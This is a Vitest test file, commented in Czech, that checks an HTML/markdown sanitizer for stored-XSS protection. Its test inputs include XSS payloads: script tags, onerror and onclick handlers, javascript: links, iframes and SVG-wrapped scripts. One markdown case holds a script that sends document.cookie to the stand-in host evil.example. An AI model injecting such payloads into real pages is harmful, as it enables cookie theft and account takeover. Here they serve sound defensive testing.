// Testy sanitizace HTML z markdownu — viz PRD-07 "Bezpečnostní nález" a ADR-005.
//
// V multi-user prostředí je cizí markdown (popis úkolu, KB stránka, ADO popis,
// náhled nahraného souboru) stored XSS, pokud se nesanitizuje před vložením
// do DOM přes `dangerouslySetInnerHTML`. Testy níže reprodukují konkrétní
// payloady jmenované v zadání: <script>, onerror=, javascript: href, <iframe>.
import { describe, expect, it } from 'vitest';
import { markdownToHtml, sanitizeHtml } from './htmlMarkdownConverter';

describe('sanitizeHtml', () => {
  it('odstraní <script> tag i s obsahem', () => {
    const dirty = '<p>Ahoj</p><script>alert(document.cookie)</script>';
    const clean = sanitizeHtml(dirty);
    expect(clean).not.toContain('<script');
    expect(clean).not.toContain('alert(document.cookie)');
    expect(clean).toContain('Ahoj');
  });

  it('odstraní onerror handler z <img>', () => {
    const dirty = '<img src="x" onerror="alert(1)">';
    const clean = sanitizeHtml(dirty);
    expect(clean).not.toMatch(/onerror/i);
    expect(clean).not.toContain('alert(1)');
  });

  it('odstraní obecně libovolný on* handler (onclick, onload, …)', () => {
    const dirty = '<div onclick="steal()" onload="steal()">klik</div>';
    const clean = sanitizeHtml(dirty);
    expect(clean).not.toMatch(/on(click|load)/i);
  });

  it('neutralizuje javascript: href v odkazu', () => {
    const dirty = '<a href="javascript:alert(1)">klikni</a>';
    const clean = sanitizeHtml(dirty);
    expect(clean).not.toMatch(/javascript:/i);
  });

  it('odstraní <iframe> celý', () => {
    const dirty = '<p>Text</p><iframe src="https://evil.example/"></iframe>';
    const clean = sanitizeHtml(dirty);
    expect(clean).not.toContain('<iframe');
    expect(clean).not.toContain('evil.example');
    expect(clean).toContain('Text');
  });

  it('odstraní <object> a <embed>', () => {
    const dirty = '<object data="evil.swf"></object><embed src="evil.swf">';
    const clean = sanitizeHtml(dirty);
    expect(clean).not.toContain('<object');
    expect(clean).not.toContain('<embed');
  });

  it('odstraní vnořený <svg><script>… payload (obcházení pomocí SVG)', () => {
    const dirty = '<svg><script>alert(1)</script></svg>';
    const clean = sanitizeHtml(dirty);
    expect(clean).not.toContain('<script');
    expect(clean).not.toContain('alert(1)');
  });

  it('zachová bezpečné formátovací tagy (strong, em, ul/li, a s http href)', () => {
    const safe =
      '<p><strong>tučně</strong> a <em>kurzíva</em></p><ul><li>bod</li></ul><a href="https://example.com">odkaz</a>';
    const clean = sanitizeHtml(safe);
    expect(clean).toContain('<strong>tučně</strong>');
    expect(clean).toContain('<em>kurzíva</em>');
    expect(clean).toContain('<li>bod</li>');
    expect(clean).toContain('href="https://example.com"');
  });

  it('na prázdný vstup vrátí prázdný řetězec', () => {
    expect(sanitizeHtml('')).toBe('');
  });
});

describe('markdownToHtml — sanitizace je nedílná součást převodu', () => {
  it('markdown obsahující surové HTML se script tagem se vyrenderuje bez scriptu', () => {
    const md =
      'Popis úkolu\n\n<script>fetch("https://evil.example/steal?c="+document.cookie)</script>';
    const html = markdownToHtml(md);
    expect(html).not.toContain('<script');
    expect(html).not.toContain('evil.example');
    expect(html).toContain('Popis úkolu');
  });

  it('odkaz s javascript: schématem v markdownu se neutralizuje', () => {
    const md = '[klikni]( javascript:alert(1) )'.replace(
      ' javascript:alert(1) ',
      'javascript:alert(1)'
    );
    const html = markdownToHtml(md);
    expect(html).not.toMatch(/javascript:/i);
  });

  it('běžný markdown (nadpisy, seznamy, tučně) se vyrenderuje beze změny obsahu', () => {
    const md = '# Nadpis\n\n- první\n- druhý\n\n**tučně**';
    const html = markdownToHtml(md);
    expect(html).toContain('<h1>Nadpis</h1>');
    expect(html).toContain('<li>první</li>');
    expect(html).toContain('<strong>tučně</strong>');
  });

  it('na prázdný markdown vrátí prázdný řetězec', () => {
    expect(markdownToHtml('')).toBe('');
    expect(markdownToHtml('   ')).toBe('');
  });
});
